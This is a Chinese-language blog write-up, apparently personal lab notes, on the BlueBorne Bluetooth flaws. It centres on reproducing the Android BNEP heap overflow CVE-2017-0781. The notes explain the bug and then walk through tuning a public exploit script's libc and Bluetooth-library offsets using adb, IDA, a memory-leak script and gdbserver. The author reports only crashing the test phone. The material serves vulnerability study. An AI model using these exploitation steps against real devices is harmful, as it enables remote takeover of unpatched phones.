蓝牙学习笔记 -- CVE-2017-0781
2022-05-09 15:01:13

1 背景

2017年9月，armis爆出了一系列蓝牙的漏洞BlueBorne（https://www.armis.com/blueborne/），共8个零day。在当年影响普通计算机、移动设备、物联网设备，如电视、手表、汽车，甚至医疗设备。20 亿台 Android、20 亿台 Windows 和 10 亿台 Apple 设备。BlueBorne具有无接触无感知接管系统的能力：只要手机开启了蓝牙，就可能被远程控制。armis给了一个针对Android的“BlueBorne检测app"，但是360移动安全团队逆向这个app发现仅仅是检测了系统的补丁日期。实际测试这个app，结果确实不准确。

8个零day如下：

Android

Android 手机、平板电脑和可穿戴设备（仅使用低功耗蓝牙的除外）都受到 Android 操作系统中发现的四个漏洞的影响，其中两个漏洞允许远程执行代码（CVE-2017-0781 和 CVE-2017 -0782），一个导致信息泄露（CVE-2017-0785），最后一个允许攻击者执行中间人攻击（CVE-2017-0783）。

Windows

该漏洞允许攻击者执行中间人攻击 (CVE-2017-8628)。

Linux

信息泄漏漏洞 (CVE-2017-1000250)

远程代码执行漏洞 (CVE-2017-1000251)

iOS

远程代码执行漏洞 (CVE-2017-14315)

2 CVE-2017-0781分析

我从安卓的CVE-2017-0781入手，分析漏洞成因、然后准备漏洞检测环境进行复现。

2.1漏洞原理

参照文章,（BlueBorne蓝牙漏洞复现 | PWN? PWN! (http://ch4r1l3.github.io)这个CVE是BNEP协议上的一个漏洞，可以堆溢出8个字节

BNEP（Bluetooth Network Encapsulation Protocol） 网络封装协议。为了使集成蓝牙技术的电脑、电话、PDA、家用电器等网络设备交换信息，需要在网络层统一数据分组。网络封装协议将来自不同网络的数据分组重新封装，通过 L2CAP 进行传输。BNEP 支持 Ipv4、Ipv6、IPX 。在BNEP之上是PAN profile, 实现了网络层。

BNEP服务主要是通过L2CAP连接封装各种形式的以太网数据包，为此BNEP定义了各种用于封装压缩和未压缩以太头的信息。

上面这幅图展示了BNEP头如何根据BNEP包的类型转换为以太报文Header。

除了各种封装消息外，BNEP还支持BNEP控制消息。控制消息有助于建立PAN连接和各种流量控制功能

为了可以让多个控制信息在一个L2CAP报文里面，一个可选的Extension header可以加在BNEP header后面，如果将BNEP header中的”extension bit“置为1，则表示这个BNEP报文会包含extension header

在Android的蓝牙协议栈中，处理BNEP控制信息的部分存在漏洞，可以堆溢出8个字节

这里是处理控制信息的部分，可以看到，过了一堆if的检查之后，会调用malloc分配一块内存，之后调用memcpy复制内存。

这里很明显有一块堆溢出，因为memcpy复制的大小刚好是内存分配的大小，但是复制的地址就变成p_bcb->p_pending_data+1，问题是+1，从导致溢出sizof(BT_HDR)=8个字节

我们再仔细看下要求的条件，ctrl_type == BNEP_SETUP_CONNECTION_REQUEST_MSG这个是判断控制信息的类型，我们可以控制b_bcb->con_state != BNEP_STATE_CONNECTED 这个是指BNEP的状态还没到连接状态

extension_present是指有扩展，p是有控制信息，rem_len是指还未解析的包的长度

因此过这个检查需要控制类型为

BNEP_SETUP_CONNECTION_REQUEST_MSG，带有扩展信息的BNEP控制包

3.2 EXP利用及调试

在exp4.py中，硬编码了几个偏移，需要动态的去修改

# For Nexus 5X 7.1.2 patch level Aug/July 2017
#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1


# Aligned to 4 inside the name on the bss (same for both supported phones)
BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x14b244

需要从手机中拖出来so文件，用ida解析去找到对应的偏移，system的偏移可以用ida找到，其他两个还需要动态调试去找，所以手机需要先root

可以使用以下命令将so文件拖出来

adb pull /system/lib/hw/bluetooth.default.so
adb pull /system/lib/libc.so

然后用ida打开libc.so文件, 在函数栏找到system函数，

将硬编码的偏移替换为0x3E98C

#LIBC_TEXT_STSTEM_OFFSET = 0x3E98C + 1

寻找偏移LIBC_SOME_BLX_OFFSET和BLUETOOTH_BSS_SOME_VAR_OFFSET

为什么要寻找偏移？如果想要pwn，我们需要libc.so和bluetooth.default.so在内存中的基址。基址是动态的，但是偏移是固定的。利用CVE-2017-0785的内存泄漏绕过ASLR保护，从而调用libc库的system函数并执行代码。内存泄漏使我们能够发现库libc.so和bluetooth.default.so已被加载的地方。

接下来要做的就是确定两个偏移和修改result的位置。进入adb shell，用su变成root，之后使用下面的命令找到libc.so和bluetooth.default.so的基址

# cat /proc/9850/maps |grep libc.so
# cat /proc/9850/maps |grep bluetooth.default

0xb6c5e000就是libc.so文件的基址;0xb393a000就是bluetooth.default.so文件的基址;

我联合参考了另外一篇文章https://www.freesion.com/article/8385368300/，在内存泄漏的地址0xb393a000和0xb3a7f000之间搜索一个值，

为了计算libc的基址，我们遵循上述相同的操作过程。

$ python2 leak.py hci1 TARGET=0C:48:85:17:20:E2 | grep "b6 c." 
000000d0  b6 cd 35 94

我选择b6 cd 35 94（d0行）这个地址，我们计算了偏移量(b6 cd 35 94-0xb6c5e000)并在脚本中更新LIBC_SOME_BLX_OFFSET中。

改变了这两个值后，我们执行（为了区分，我把改后的重命名为exp1）

我们在result中找到b3 a1 37 4d和b6 cd 35 94，根据对应的行和列，更新脚本中的值。

更新完后，再次执行攻击，可以crash手机，手机会崩溃。

之后的动态调试，我用的受害者手机会扛不住调试，直接死机，所以本次实验我只做完了以上部分。以下调试的内容，有条件的研究员可以继续进行。

动态调试

剩下还有一个

BSS_ACL_REMOTE_NAME_OFFSET，这个偏移需要使用find去遍历内存找。

首先从github上面下载一个静态链接的arm gdbserver

https://github.com/marcinguy/arm-gdb-static/raw/master/gdbserver

然后用adb将其传到手机上面，顺便加个权限，映射一下端口


adb push ./gdbserver /data/local/tmp
adb shell chmod 777 /data/local/tmp/gdbserver
adb forward tcp:8798 tcp:8798

然后用ps找到bluetooth进程，pid为9850

adb shell
su
adb shell ps |grep bluetooth

再使用gdbserver进行attach

/data/local/tmp/gdbserver --attach 0.0.0.0:8798 9850

我之后在kali上使用gdb-multiarch去连接，进行远程调试

gdb-multiarch

target remote 127.0.0.1:8798 #127.0.0.1换成手机的ip

这样就能成功的进行调试。

执行脚本，将bluetooth进程弄crash，这个时候gdb还没退出，然后可以遍历一下找到对应的位置

下面是在so文件内存附近寻找toybox这个字符串的命令

$ find 0xb393a000,0xb4f3a000,{char[6]}"toybox"  #0xb4f3a000这个参数随意写
0xb394b000 #正常情况下，会在这之间找到一个值
warning: Unable to access 16000 bytes of target memory at 0xe856e351, halting search.

返回的地址0xb394b000减去0xf，再减去so基址，就是BSS_ACL_REMOTE_NAME_OFFSE

BSS_ACL_REMOTE_NAME_OFFSET=0xb394b000-0xf-0xb393a000
